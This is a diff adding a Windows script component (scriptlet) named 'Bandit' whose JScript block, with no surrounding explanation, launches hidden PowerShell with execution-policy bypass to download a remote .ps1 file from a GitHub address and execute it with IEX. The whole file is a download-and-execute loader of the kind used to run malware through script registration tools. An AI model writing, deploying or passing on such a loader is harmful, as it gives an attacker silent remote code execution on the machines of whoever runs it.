@@ -1,0 +1,22 @@
+<?XML version="1.0"?>
+<scriptlet>
+ 
+<registration
+    description="Bandit"
+    progid="Bandit"
+    version="1.00"
+    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+    remotable="true"
+    >
+</registration>
+ 
+<script language="JScript">
+<![CDATA[
+ 
+        var r = new ActiveXObject("WScript.Shell").Run("powershell -ep bypas IEX (new-object net.webclient).downloadstring('https://github.com/st0rmspirit/test/blob/master/pc.ps1')",0);
+         
+     
+]]>
+</script>
+ 
+</scriptlet>
